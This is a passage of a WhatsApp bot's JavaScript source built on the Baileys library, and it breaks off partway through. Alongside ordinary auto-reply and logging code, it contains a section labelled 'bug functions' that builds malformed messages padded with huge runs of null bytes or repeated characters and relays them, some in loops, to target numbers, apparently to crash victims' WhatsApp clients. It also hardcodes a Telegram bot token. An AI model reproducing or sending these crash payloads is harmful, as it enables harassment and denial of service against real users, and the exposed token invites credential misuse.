
const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, makeInMemoryStore, makeCacheableSignalKeyStore, areJidsSameUser, sendjson, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const NodeCache = require('node-cache');

//bug database
const { gutotext1 } = require('./80/gutotext1')
const { gutotext2 } = require('./80/gutotext2')
const { gutotext3 } = require('./80/gutotext3')
const { gutotext4 } = require('./80/gutotext4')
const { gutotext5 } = require('./80/gutotext5')
const { gutotext6 } = require('./80/gutotext6')
const { gutotext7 } = require('./80/gutotext7')
const { gutotext8 } = require('./80/gutotext8')
const { gutotext9 } = require('./80/gutotext9')
const { gutotext10 } = require('./80/gutotext10')
const { gutotext11 } = require('./80/gutotext11')
const wkwk = fs.readFileSync(`./80/x.mp3`)
const xsteek = fs.readFileSync(`./80/x.webp`)
const o = fs.readFileSync(`./80/o.jpg`)

//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))

//autorep
const VoiceNoteguto = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const Stickerguto = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const Imageguto = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const Videoguto = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const Docguto = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const Zipguto = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const Apkguto = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

//time
const xtime = moment.tz('Asia/Karachi').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Karachi').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Karachi').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var gutoytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var gutoytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var gutoytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var gutoytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var gutoytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var gutoytimewisher = `Good Morning 🌄`
 } 
module.exports = uwu = async (uwu, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplyglobal.selectedRowId : (m.mtype == 'templateButtonreplyglobalMessage') ? m.message.templateButtonreplyglobalMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplyglobal.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await uwu.decodeJid(uwu.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await uwu.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = uwu.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? uwu.user.id.split(':')[0] + "@s.whatsapp.net" || uwu.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(uwu, m, premium);
        
        
const numeroFormatado = q.replace(/[^\d]/g, '');
const numi = numeroFormatado + '@s.whatsapp.net'

//group chat msg by guto
const replyglobal = (teks) => {
uwu.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./GlobalMedia/thumb.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}

async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replyglobal('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const gutoyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'DGguto',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            gutoyresult.push(result)
        }
    resolve(gutoyresult)
    })
}

//bug functions
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./80/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🌟 Guto 🌟Guto 🌟Guto\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./80/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝙂𝙐𝙏𝙊̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickguto = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `🩸Heart V1 by rui`
}
}
}
async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await uwu.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationgutoy(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🌟Rui 🦠Rui 🌀Rui ⚡Rui 🌠Rui 🌊Rui 🌪️Rui`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await uwu.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function gutokillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🦠Rui",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/1mr4Y16/anjay.jpg" } }, { upload: uwu.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #🩸Rui"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await uwu.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function aipong(target) {
await uwu.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function listgutofck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🦠Rui"+" ".repeat(920000),
        'footerText': `🦠Rui 🦠Rui 🦠Rui 🦠Rui 🦠Rui 🦠Rui 🦠Rui`,
        'description': `🦠Rui 🦠Rui 🦠Rui 🦠Guto 🦠Guto 🦠Guto 🦠Guto`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickguto });
await uwu.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


const sendReaction = async reactionContent => {
  uwu.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   uwu.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    uwu.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "Guto xp KKkkkkk"
          },
          'footer': {
            'text': 'Rui 🩸'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'Rui xp KKkkkkk꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await uwu.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "Rui xp KKkkkkk꙰̸" + "\0".repeat(920000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡💤⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡💤⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await uwu.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': '\0'.repeat(999),
          'degreesLongitude': '\0'.repeat(999),
          'caption': 'ੌℊ𝓊𝓉ℴ𝓍𝓉𝒶𝓏-𝓍𝓅᤻' + '555189926591@s.whatsapp.net'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await uwu.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  uwu.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': 'Rui.exe' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  uwu.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return uwu.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return uwu.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};

const gutoimun = (texto) => {
uwu.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}

const subscribe_dgguto = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Rui's ur father`
}}
}
async function gutoyCrashy(dgguto,chat) {
uwu.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgguto}.${gutotext1}` ,
caption: `${dgguto + gutotext1}`,
}, {quoted: subscribe_dgguto })
}
//end bug functions

async function loading () {
var gutolod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 ☀️..."
]
let { key } = await uwu.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < gutolod.length; i++) {
await uwu.sendMessage(from, {text: gutolod[i], edit: key });
}
}

        if (!uwu.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            uwu.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        uwu.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        uwu.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        uwu.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let gutorecordin = ['recording','composing']
        let gutorecordinfinal = gutorecordin[Math.floor(Math.random() * gutorecordin.length)]
        uwu.sendPresenceUpdate(gutorecordinfinal, from)

        }
        
        if (autobio) {
            uwu.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('91') && global.anti91 === true) {
            return uwu.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await uwu.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await uwu.getName(i)}\nFN:${await uwu.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}


	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let Bhosdikaguto of VoiceNoteguto) {
if (budy === Bhosdikaguto) {
let audiobuffy = fs.readFileSync(`./GlobalMedia/audio/${Bhosdikaguto}.mp3`)
uwu.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let Bhosdikaguto of Stickerguto){
if (budy === Bhosdikaguto){
let stickerbuffy = fs.readFileSync(`./GlobalMedia/sticker/${Bhosdikaguto}.webp`)
uwu.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let Bhosdikaguto of Imageguto){
if (budy === Bhosdikaguto){
let imagebuffy = fs.readFileSync(`./GlobalMedia/image/${Bhosdikaguto}.jpg`)
uwu.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let Bhosdikaguto of Videoguto){
if (budy === Bhosdikaguto){
let videobuffy = fs.readFileSync(`./GlobalMedia/video/${Bhosdikaguto}.mp4`)
uwu.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
uwu.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let Bhosdikaguto of Apkguto) {
if (budy === Bhosdikaguto) {
let buffer = fs.readFileSync(`./GlobalMedia/apk/${Bhosdikaguto}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
uwu.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let Bhosdikaguto of Zipguto) {
if (budy === Bhosdikaguto) {
let buffer = fs.readFileSync(`./GlobalMedia/zip/${Bhosdikaguto}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let Bhosdikaguto of Docguto) {
if (budy === Bhosdikaguto) {
let buffer = fs.readFileSync(`./GlobalMedia/doc/${Bhosdikaguto}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
